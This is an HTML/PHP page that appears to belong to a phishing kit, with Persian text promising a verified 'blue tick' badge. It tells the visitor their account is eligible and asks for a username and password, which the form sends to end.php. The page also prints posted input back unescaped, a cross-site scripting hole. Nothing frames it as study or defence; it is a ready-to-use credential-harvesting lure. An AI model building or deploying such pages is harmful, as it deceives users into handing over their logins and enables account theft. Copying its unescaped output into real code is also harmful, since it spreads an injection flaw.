<!-- #->Dev => @ZProGrammer - @ZProGramming -->
<!DOCTYPE html>
<html lang="en" >
<head>
  <meta charset="UTF-8">
  <meta name="description" content="">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <title>دریافت تیک آبی</title>
  <link href="https://cdn.rawgit.com/rastikerdar/shabnam-font/v4.0.0/dist/font-face.css" rel="stylesheet" type="text/css" /><link rel="stylesheet" href="assets/css/style.css">

</head>
<body>

<div style="height: 560px;" class="card">
  <div class="field">
  
    <span class="header"> مرحله پایانی</span>
    
     <br>
        <div id="user"><img src="assets/img/uv.png" alt="" width="100" height="100" /></div>
        <?php echo $_POST['id'];?>
    <form   action="end.php" method="post"  >
    <div class="form-group">
<!-- #->Dev => @ZProGrammer - @ZProGramming -->
      <input type="text" id="id" name="id" required="required" autocomplete="off">
      <label for="input" class="control-label">نام کاربری</label><i class="bar"></i>
    </div>
    <div class="form-group">
      <input type="password" id="lic" name="lic" required="required" autocomplete="off">
      <label for="input" class="control-label">پسورد</label><i class="bar"></i>
    </div>
    <div class="button-container">
    
      <button type="submit" value="Submit" class="button"><span>مرحله بعد</span></button>
   
    </div>
    </form>
تبریک!

حساب شما توانایی دریافت تیک آبی را دارد
  </div>

  </div>
</div>

  <script src='https://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js'></script>

</body>
</html>
<!-- #->Dev => @ZProGrammer - @ZProGramming -->